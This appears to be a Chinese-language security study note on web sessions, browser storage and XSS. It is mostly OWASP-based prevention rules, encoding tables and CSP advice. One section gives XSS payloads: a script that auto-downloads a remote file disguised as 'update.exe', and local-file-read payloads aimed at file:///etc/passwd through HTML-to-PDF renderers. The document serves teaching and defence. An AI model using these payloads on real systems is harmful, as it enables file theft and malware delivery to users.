参考 https://shiro.apache.org/session-management.html#SessionManagement-SessionTimeout

默认情况下，Shiro的SessionManager实现默认为30分钟的会话超时。也就是说，如果任何Session创建的内容在 lastAccessedTime 30分钟或更长时间内保持空闲状态（未使用，即未更新），则该内容Session被视为已过期，将不再被允许使用。

在shiro.ini中设置默认会话超时.
```
[main]
...
# 3,600,000 milliseconds = 1 hour
securityManager.sessionManager.globalSessionTimeout = 3600000
```


##### 增删改查 - sessionStorage

```JavaScript
// 写入数据 - sessionStorage.setItem方法  写入key-value对
sessionStorage.setItem("key1","value1");

// 读取数据 - sessionStorage.getItem方法  根据key读取对应value
var valueSession = sessionStorage.getItem("key1");

//删除数据 - sessionStorage.removeItem方法  删除一条Item (key-value对)
sessionStorage.removeItem('key');

//清空数据 - sessionStorage.clear方法  清除sessionStorage中的所有 Item(key-value对)
sessionStorage.clear();
```

##### 增删改查 - localStorage

```JavaScript
// 读取数据 - 读取localStorage中的所有的数据
alert(JSON.stringify(localStorage))
```

```JavaScript
// 读取数据 - 遍历localStorage中的所有的数据        使用了localStorage.key方法
for(var i = 0; i < localStorage.length; i++)
{
    console.log(localStorage.key(i));
}


// 解释一下 localStorage.key方法
// 根据 索引(从0开始) 返回对应的 key-value对.
// If the index does not exist, null is returned.
localStorage.key(0);
```

```JavaScript
// 写入数据 - 写入一条Item  Key为key_1  Value为value_1
localStorage.setItem('key_1', 'value_1');
```
##### 增删改查 - IndexedDB

https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API/Using_IndexedDB


#### XSS利用方式 - 自动下载文件

* 待下载文件的位置
  * 同域 - 在域`a.com` 如果下载同域的文件,则无需考虑跨域.
  * 非同域 - 在域`a.com` 如果下载非同域`https://file.io`的文件,需要"跨域"
    * 跨域方案1 - 设置`https://file.io/`的CORS策略,允许来自域`a.com`的跨域请求.

在`a.com`下 自动下载文件
```JavaScript
// 使用`fetch API`和`Blob(Binary large object)`对象
fetch('https://file.io/test')
.then(resp => resp.blob())
.then(blob => {
const url = window.URL.createObjectURL(blob);
const a = document.createElement('a');
a.style.display = 'none';
a.href = url;
a.download = 'update.exe';// the filename showed
document.body.appendChild(a);
a.click();
window.URL.revokeObjectURL(url);
})
.catch(() => console.log('download fail!'));
```

#### XSS利用方式 - 读取本地文件

* 利用XSS读取本地文件 - 利用条件(漏洞根源)
  * 条件1 web后端使用了"同源策略不够严格"的html解析库
  * 条件2 该html解析库的输入(html代码)用户可控
* 实际案例 - 转换html为pdf文件 [Local File Read via XSS in Dynamically Generated PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
  * 满足条件1 已知html解析库[wkhtmltopdf](https://github.com/wkhtmltopdf/wkhtmltopdf)存在[The same origin policy allows local files to be read by default · Issue #4536](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4536)
  * 满足条件2 该html解析库的输入(html代码)用户可控
* 利用XSS读取本地文件 - 构造1.html(payload)使解析库解析 能否解析成功取决于不同解析库的具体实现
  * payload类型1 利用XMLHttpRequest发起请求读取`file://`域下的本地文件(在现代浏览器下 因为必须遵循同源策略 与CORS 所以无法成功)
  * payload类型2 利用`<iframe>`标签读取`file://`域下的本地文件 `<iframe src="file:///etc/passwd">`(在现代浏览器下 也可以成功)
  * ...
* 利用XSS读取本地文件 - 结果回显
  * 回显方式1 直接回显 将"文件内容"输出到document 可直接看到经过html解析后的文件`result.pdf`
  * 回显方式2 带外请求 使用JavaScript构造跨域请求 发送携带敏感信息("文件内容")的http请求 到接受信息的`evil.com`域


```html
<!-- 1.html -->

<html>
<body>

<!-- payload 1 -->
<!-- 
原理:用XMLHttpRequest发起请求
注意:这种方法在现代浏览器(Chrome/Firefox等)中无法读取成功 因为现代浏览器中同源策略做了严格的跨域限制

如Chrome浏览器下
无论在任何protocol schemes下 用XMLHttpRequest发起的请求 都必须遵守CORS 而CORS支持的protocol schemes是白名单 即CORS并不支持file://协议! 
所以即使在`file://`域下 同样被CORS限制 无法用XMLHttpRequest读取到`file://`域下其他文件. 报错提示:
Access to XMLHttpRequest at 'file:///etc/passwd' from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, data, chrome, chrome-extension, https.

如Firefox浏览器下报错提示:
已拦截跨源请求：同源策略禁止读取位于 file:///etc/passwd 的远程资源。（原因：CORS 请求不是 http）。
CORS 请求只能使用 HTTPS URL 方案，但请求指定的 URL 可能是不同类型。这种情况经常发生在 URL 指定本地文件，例如使用了 file:/// 的 URL。
详情https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS/Errors/CORSRequestNotHttp
 -->

<script>
//document.write(window.location.href);// it is file:///tmp/1.html
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();

// payload1 解析JavaScript过程:
//     创建XMLHTTPRequest对象
//     使用该对象`.open`函数 初始化一个新的request(默认异步)
//     再使用该对象的`.send`函数 发送该request去读取`file://`域下的另一文件`file:///etc/passwd`
//     如果解析库没做好跨域防御 则该request的响应内容就是文件`/etc/passwd`的内容
//     使用`document.write`将该request的响应内容(文件内容)写入`document`

</script>







<!-- payload 2 -->
<!-- 原理:如果本document是在`file://`域下打开的  那么本document可读取其他`file://`下的文件  即使在现代浏览器中也可以读取成功 -->

<iframe src="file:///etc/passwd">

</body>
</html>
```

### SDL - 防御与修复方案

* 需求与设计阶段(了解产品背景和技术架构 并给出相应的建议)
  * 建议使用成熟的现代javascript框架 它们内置了非常好的XSS保护 注意规范使用
    * ReactJS - 禁止使用[`dangerouslySetInnerHTML`](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml)函数
    * Angular (2+) - 禁止使用这样的函数[`bypassSecurityTrust{something}`](https://angular.io/guide/security#bypass-security-apis) (如 `bypassSecurityTrustHtml`, `bypassSecurityTrustStyle`, 等).  
    * Angular (2+) - 构建Angular模板必须使用`-prod`参数  即`ng build --prod`  以避免模板注入(template injection)
  * 建议使用CSP - 内容安全策略(Content Security Policy)
    * CSP本质 - 浏览器端的白名单机制. 允许开发者通过`HTTP Response`为Web应用的客户端资源(JavaScript, CSS, images...)设置源白名单 使浏览器执行"开发者设置的CSP策略"
    * 启用CSP
      * 方法1 通过设置Response Header `Content-Security-Policy:`
      * 方法2 通过设置Response Body `meta`标签 `<meta http-equiv="Content-Security-Policy" content="xxx">`
    * 配置CSP - 参考W3C标准[Content Security Policy Level 3](https://w3c.github.io/webappsec-csp/) 与 [CSP Reference & Examples](https://content-security-policy.com/)
      * 例如`default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self';`
    * CSP安全评估工具 - [CSP Evaluator](https://csp-evaluator.withgoogle.com/)由Google开发
  * 建议使用 web应用的"自动转义模版系统"(Auto-Escaping Template System) - Web应用框架的自动上下文转义功能(automatic contextual escaping functionality)
    * 如 [AngularJS strict contextual escaping](https://docs.angularjs.org/api/ng/service/$sce)
    * 如 [Go Templates](https://golang.org/pkg/html/template/)
  * 建议使用`X-XSS-Protection`响应头 - 现代浏览器默认开启. 使用Response Header`X-XSS-Protection: 1` 使浏览器为当前页面强制重新开启XSS filter(如果用户禁用了XSS filter)
  * API接口 - 显式规定MIME类型. 即Response Header `Content-Type`的值. 如json格式的Response 则设置为`Content-type: application/json`
  * Cookie安全设计参考 - [Security Cookies Whitepaper](https://www.netsparker.com/security-cookies-whitepaper//?utm_source=twitter.com&utm_medium=social&utm_content=security+cookies+whitepaper&utm_campaign=netsparker+social+media)
    * 如在`Set-Cookie: `中增加  `; secure` 仅允许HTTPS协议中传输cookie
    * 如在`Set-Cookie: `中增加  `; HttpOnly` 当客户端脚本代码读取cookie 则浏览器返回一个空字符串

#### XSS防御方法

* 参考
  * [Cross_Site_Scripting_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md)
  * [DOM_based_XSS_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.md)

* HTML实体编码(HTML entity encoding) 只用来它来防御XSS是远远不够的!!
  * 适用情况1. 将"不受信任的数据"放在 `HTML文档body`(the body of the HTML document)中时, 如`<div>`标签内, 需要做HTML实体编码
  * 适用情况2. 将"不受信任的数据"放在 `HTML属性`中时, 需要做HTML实体编码(开发人员最好给HTML标签的属性的值,前后都加上引号)
  * 无效情况1. 将"不受信任的数据"放在 **`<script>`** 标签内的任何位置时, 不用做HTML实体编码, 因为对防御XSS无效!!
  * 无效情况2. 将"不受信任的数据"放在 **"事件处理属性"(event handler attribute)** 中时, 如`onmouseover`, 不用做HTML实体编码, 因为对防御XSS无效!!
  * 无效情况3. 将"不受信任的数据"放在 **`CSS`** 中时, 不用做HTML实体编码, 因为对防御XSS无效!!
  * 无效情况4. 将"不受信任的数据"放在 **`URL`** 中时, 不用做HTML实体编码, 因为对防御XSS无效!!

* 防御XSS的安全编码库(Security Encoding Library)
  * [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project) - 内含了各种位置下的正确编码处理函数
  

* XSS防御规则#0 - 拒绝所有(deny all) 即禁止把"不受信任的数据"放入HTML document的任何位置(除了规则#1-5中允许的那5个位置). 如以下位置禁止放入"不受信任的数据"(用户输入等):
  * `<script>...script标签中 永不放入不受信任的数据...</script>`
  * `<!--...HTML注释中_永不放入不受信任的数据...-->`
  * `<div ...HTML标签的属性的名称中_永不放入不受信任的数据...=test />`
  * `<HTML标签名称中_永不放入不受信任的数据... href="/test" />`
  * `<style>...CSS中_永不放入不受信任的数据...</style>`
  * 注意 永远禁止接受来自不受信任来源的JavaScript代码并运行它 没有任何防御方法可以解决这种情况! (如 名为`callback`的参数包含JavaScript代码段)


* XSS防御规则#1 - 将"不受信任的数据"放在 HTML元素的Content之前，需要做HTML实体编码
  * 将"不受信任的数据"放在 常见标签中时，需要做HTML实体编码 `div`, `p`, `b`, `td` ...
    * 如 `<body>...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...</body>`
    * 注意 推荐使用十六进制格式的HTML实体 除了XML中重要的5个字符(`&` `<` `>` `"` `'`) 以及正斜杠`/`  见附表1
    * 注意 数据输出位置不同 则处置方式不同. 所以在其他html上下文中 XSS防御规则#1 远远不够. 参考其他规则!!

附表1

|字符|HTML实体|描述|
|:---:|-----|-----|
| & | `&amp;`|XML中重要的5个字符之一|
| < | `&lt;`|XML中重要的5个字符之一|
| > | `&gt;`|XML中重要的5个字符之一|
| " | `&quot;`|XML中重要的5个字符之一|
| ' | `&#x27;`|XML中重要的5个字符之一   更推荐使用`&#x27;`  因为`&apos;`不在HTML规范 而在XML和XHTML规范中|
| / | `&#x2F;`|`/`有助于结束一个HTML实体|


* XSS防御规则#2 - 将"不受信任的数据"放在 HTML元素的常见的属性的值(如`width`,`name`,`value`等)之前, 需要做HTML实体编码
  * 反例 属性的值没有被引号(单引号或双引号)包裹, 很不安全. 使用"能够跳出属性值的字符"跳出属性的值 `[space]` `%` `*` `+` `,` `-` `/` `;` `<` `=` `>` `^` `|` 
  * 正例 所有属性的值都应该被 单引号 **`'`** 或 双引号 **`"`** 包裹, 并对属性的值做 HTML实体编码 `<div attr='...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...'>content`
  * 防御方案 - 必须用引号包裹属性的值,并且属性的值需要做HTML实体编码(用`&#xHH;`转义"除了字母数字字符之外的"所有`ASCII < 256`的字符 即可转义"能够跳出属性值的字符")
  * 注意 本规则不应被用于 复杂的属性(如`href`,`src`,`style`等) 和 任何"事件处理属性"(如`onmouseover`等) 需参考 XSS防御规则#3
* XSS防御规则#3 - 将 "不受信任的数据" 放在 "JavaScript Data Values" 之前, 需要做 `JavaScript Escape`
  * 本规则针对"动态生成的JavaScript代码"的情况: 如`<script>`脚本块, 和 "事件处理属性"(event handler attribute)
  * 防御方案 - 将 "不受信任的数据" 放在 JavaScript代码中, 如果放在被引号括起来的"数据值"部分, 就需要将数据进行`JavaScript Encoding`
    * (1). ascii to **hex**.  格式为`\xHH` 转义"除了字母数字字符之外的"所有`ASCII < 256`的字符, 即可转义"能够跳出属性值的字符".  注: The extended ASCII table 用8bit表示了共256个字符 DEC 0号-255号 即HEX 00-FF 参考https://ascii-code.com
    * (2). utf-8 to **unicode**. 格式为`\uXXXX`(X是整数). 用unicode转义格式(escaping format) 转义所有字符, 除了字母数字字符.  注: 推荐方案,适用范围广.
    * 注意 不能使用其他转义的方法.  如`\"`这种转义方法可以被逃脱 **escape-the-escape attacks**.
      * 原因1.引号字符`'`或`"` 可能被首先运行起来的"HTML属性解析器"(HTML attribute parser)匹配到.
      * 原因2.逃脱转义. 攻击者构造输入数据`\"` 可能被转义为 `\\"` 使双引号逃脱转义.
  * 注意 将"不受信任的数据"放在 **某些JavaScript函数**中 永远不安全!! 做任何转义都不行!! 包括`JavaScript Escape`也不行
    * 如 window.setInterval `<script>window.setInterval('...此处的数据做任何转义都无法防御XSS...');</script>`
  * 正例 传入实参 `<script>alert('...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...')</script>`
  * 正例 变量赋值 `<script>x='...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...'</script>`
  * 正例 事件处理属性`<div onmouseover="x='...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...'"</div>`
* XSS防御规则#3.1 - HTML转义HTML内容中的JSON值. 并使用`JSON.parse`读取数据.
  * API接口 - 显式规定MIME类型. 即Response Header `Content-Type`的值. 如json格式 则设置为`Content-type: application/json`
  * anti-pattern - 不能直接这么写`<script>var initData = <%= data.to_json %>; </script>` 而必须用以下的编码方式:
    * 编码方式1 安全的JSON序列化程序(JSON serialization)
      * 一个安全的JSON serializer能够使开发人员将 `JSON` 序列化为 **"绝对的JavaScript文本字符串"(string of literal JavaScript)** 然后把它嵌入`<script>`标签中是安全的.
      * 注意 需要转义的有: HTML characters 和 JavaScript line terminators. 参考 [Yahoo JavaScript Serializer](https://github.com/yahoo/serialize-javascript)
    * 编码方式2 HTML实体编码
      * 数据源(HTML某个元素) - 将`JSON block`作为普通元素放在页面上, 标签中的数据内容 经过HTML实体编码
      * 数据消费/使用(javascript) - javascript脚本通过该元素的`.innerHTML`获取标签中的数据内容

```html
<!-- 安全的例子 -->
<!-- 数据源(HTML某个元素) -->

<div id="init_data" style="display: none">
 <%= html_escape(data.to_json) //"后端数据"输出(写数据)到"前端html的某个标签":必须先对数据进行"html编码" 再输出 %>
</div>
```


```javascript
// 数据消费/使用(javascript)

// external js file - 读取数据的javascript可以保存在外部文件中, 从而更容易实现CSP加固(enforcement)
// 读取id为'init_data' 的div标签的内容
var dataElement = document.getElementById('init_data');

// 使用javascript中的`JSON.parse`方法 读取div标签中的数据 // decode and parse the content of the div
var initData = JSON.parse(dataElement.textContent);

// 除了上面提到的 在client端(浏览器)JavaScript中直接 encode/decode JSON的方法,
// 还可以在server端 normalize JSON数据(即服务器端直接将JSON数据做好encode), 然后再返回给浏览器:
// 如 server端 将Response中的JSON数据 `<` 转换为 `\u003c` 形式
```

* XSS防御规则#4 - 将"不受信任的数据"放在 HTML样式属性值(Style Property Values)之前, 进行CSS Encode 和"严格验证"(Strictly Validate)
  * 防御方案 - 将"不受信任的数据"放在stylesheet或 **`<style>`** 标签中时, 只能放在属性的值中 (其他位置都不能放 尤其是复杂的属性 如`url`, `behavior`, 和自定义的`-moz-binding`), 并用`\HH`转义"除了字母数字字符之外的"所有`ASCII < 256`的字符
    * 注意 不能使用`\"`这种可被逃逸的简单的转义 (1.运行时引号字符可能被HTML属性解析器首先匹配 2.输入的`\"`可能被转义为`\\"`使双引号逃脱转义)
    * 注意 所有属性的值都需要被引号包裹 - 否则很不安全 使用"能够跳出属性值的字符"跳出属性的值 `[space]` `%` `*` `+` `,` `-` `/` `;` `<` `=` `>` `^` `|` 
    * 注意 建议使用严格的CSS编码(CSS encoding)和验证来防止"被引号包裹的属性"和"没被引号包裹的属性"的XSS攻击
    * 注意 在带引号的字符串中的`</style>`也能够闭合样式块(style block)，因为HTML解析器比JavaScript解析器先运行
  * 注意 将"不受信任的数据"放在 某些CSS内容中永远不安全!! 即使做了CSS Escape也对防御XSS无效!
    * 1. `URLs`必须保证只能以`http`开头(不能以`javascript`开头)
      * 反例`{ background-url : "javascript:alert(1)"; }  // and all other URLs`
    * 2. 属性的值不能以`expression`开头  因为IE的表达式属性(expression property)允许在此执行JavaScript
      * 反例`css{ text-size: "expression(alert('XSS'))"; }   // only in IE.`


正例
```html
<style>
selector { property : ...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...; }
</style>
```

```html
<style>
selector { property : "...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE..."; }
</style>
```

```html
<!-- 内联(Inline Styles) -->
<span style="property : ...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...">text</span>

<h1 style="color:blue;margin-left:30px;">This is a heading</h1>
```

* 防御规则#5 - 将"不受信任的数据"放在 HTML URL Parameter 之前进行"URL转义"(URL Escape)
  * 防御方案 - 将"不受信任的数据"放在 HTML的GET参数的值之前，需要进行"URL转义"(URL Escape):使用`%HH`转义"除了字母数字字符之外的"所有`ASCII < 256`的字符
    * 注意 所有属性的值都需要被引号包裹 - 否则很不安全 使用"能够跳出属性值的字符"跳出属性的值 `[space]` `%` `*` `+` `,` `-` `/` `;` `<` `=` `>` `^` `|` 
    * 注意 URLs中禁止使用`data:` - 因为转义无法禁止攻击者使用`data:`使"数据"跳出URLs变为"代码"
    * 注意 不要使用URL编码对"完整URL"或"相对URL"进行编码
      * 输入验证 - 如果将"不受信任的数据"放在`href`, `src`等基于URL的属性(URL-based attributes)中，需要验证输入数据以确保它没有指向不期望的协议，尤其是`javascript:` 如`<a href="javascript:alert(&#x27;XSS&#x27;)">Click Me!!</a>`
      * 输出编码 - 像其他数据一样，URL的编码应该基于显示内容(输出)  例如`HREF=`中的值是用户驱动的URL 它应该被编码


正例
```html
<a href="http://www.somesite.com?test=...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...">link</a >
```

```java
// 输出编码 - 后端对href属性值中的URL进行编码
String userURL = request.getParameter( "userURL" )
boolean isValidURL = Validator.IsValidURL(userURL, 255); 
if (isValidURL) {  
    <a href="<%=encoder.encodeForHTMLAttribute(userURL)%>">link</a>
}
```

#### XSS防御规则总结

| Data Type | Context                                  | Code Sample                                                                                                        | Defense                                                                                                                                                                                        |
|-----------|------------------------------------------|--------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| String    | HTML Body                                |  `<span>UNTRUSTED DATA </span>`                                                                          | HTML Entity Encoding (rule \#1).                                                                                                                                                               |
| String    | Safe HTML Attributes                     | `<input type="text" name="fname" value="UNTRUSTED DATA ">`                                               | 白名单HTML实体编码 (防御规则\#2), 只允许将"不受信任的数据"放入"白名单"(表格下附:安全的HTML属性),严格验证其他的(不安全的)HTML属性 如 `background` `id` `name` |
| String    | GET Parameter                            | `<a href="/site/search?value=UNTRUSTED DATA ">clickme</a>`                                               | URL Encoding (防御规则\#5).                                                                                                                                                                       |
| String    | "不受信任的数据"在`src`或`href`属性 | `<a href="UNTRUSTED URL ">clickme</a> <iframe src="UNTRUSTED URL " />`                                   | Canonicalize input, URL Validation, Safe URL verification, Whitelist http and https URL's only (Avoid the JavaScript Protocol to Open a new Window), Attribute encoder.                        |
| String    | CSS Value                                | `html <div style="width: UNTRUSTED DATA ;">Selection</div>`                                                   | Strict structural validation (rule \#4), CSS Hex encoding, Good design of CSS Features.                                                                                                        |
| String    | Javascript Variable                      | `<script>var currentValue='UNTRUSTED DATA ';</script> <script>someFunction('UNTRUSTED DATA ');</script>` | Ensure JavaScript variables are quoted, JavaScript Hex Encoding, JavaScript Unicode Encoding, Avoid backslash encoding (`\"` or `\'` or `\\`).                                                 |
| HTML      | HTML Body                                | `<div>UNTRUSTED HTML</div>`                                                                             | HTML Validation (JSoup, AntiSamy, HTML Sanitizer...).                                                                                                                                          |
| String    | DOM XSS                                  | `<script>document.write("UNTRUSTED INPUT: " + document.location.hash );<script/>`                        | [DOM_based_XSS_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.md)  |


**安全的HTML属性(Safe HTML Attributes)**

根据如下的"白名单"，可实现"在各种不同的上下文中安全地渲染不受信任的数据"

`align`, `alink`, `alt`, `bgcolor`, `border`, `cellpadding`, `cellspacing`, `class`, `color`, `cols`, `colspan`, `coords`, `dir`, `face`, `height`, `hspace`, `ismap`, `lang`, `marginheight`, `marginwidth`, `multiple`, `nohref`, `noresize`, `noshade`, `nowrap`, `ref`, `rel`, `rev`, `rows`, `rowspan`, `scrolling`, `shape`, `span`, `summary`, `tabindex`, `title`, `usemap`, `valign`, `value`, `vlink`, `vspace`, `width`.

#### 输出编码 - 规则总结

输出编码(Output Encoding)的作用:将"不受信任的输入数据"转换为"安全格式"，从而输出(展示"数据")给用户,避免了在浏览器中执行"代码"


| Encoding Type     | Encoding Mechanism |
|-------------------------|----------------------------------------------------------------------------------------------------------------------------------------------|
| HTML Entity Encoding    | Convert `&` to `&amp;`, Convert `<` to `&lt;`, Convert `>` to `&gt;`, Convert `"` to `&quot;`, Convert `'` to `&#x27;`, Convert `/` to `&#x2F;`|
| HTML Attribute Encoding | 必须用引号包裹属性的值,并且属性的值需要做HTML实体编码(用 十六进制Hex值的HTML实体编码`&#xHH;`转义"除了字母数字字符之外的"所有ASCII < 256的字符 即可转义"能够跳出属性值的字符").|
| URL Encoding            | [Standard percent encoding](http://www.w3schools.com/tags/ref_urlencode.asp). URL编码应该只用来编码参数的值,不能对"整个URL"或"URL的path部分"进行编码. |
| JavaScript Encoding     | utf-8 to **unicode**. 格式为`\uXXXX`(X是整数). 用unicode转义格式(escaping format) 转义所有字符, 除了字母数字字符. |
| CSS Hex Encoding        | CSS转义(CSS escaping) 支持 `\XX` 和 `\XXXXXX`. Using a two character escape can  cause problems if the next character continues the escape sequence.  There are two solutions (a) Add a space after the CSS escape (will be  ignored by the CSS parser) (b) use the full amount of CSS escaping  possible by zero padding the value. |

#### 应急响应

* 存储型XSS
  * 必须删除业务数据库中的XSSpayload - 如果在web系统A中发现了存储型XSS，web系统A修复了XSS漏洞（web系统A做了输出编码 XSSpayload无法执行），但如果没有删除业务数据库中的XSSpayload，则可能在"XSS防御能力较弱"的web系统B中，从同一个数据库中读取出的同一条数据（XSSpayload），那么在web系统B会触发XSS漏洞

#### 浏览器自带的XSS防御机制 XSS filter

搜索绕过方法`chrome xss filter bypass`
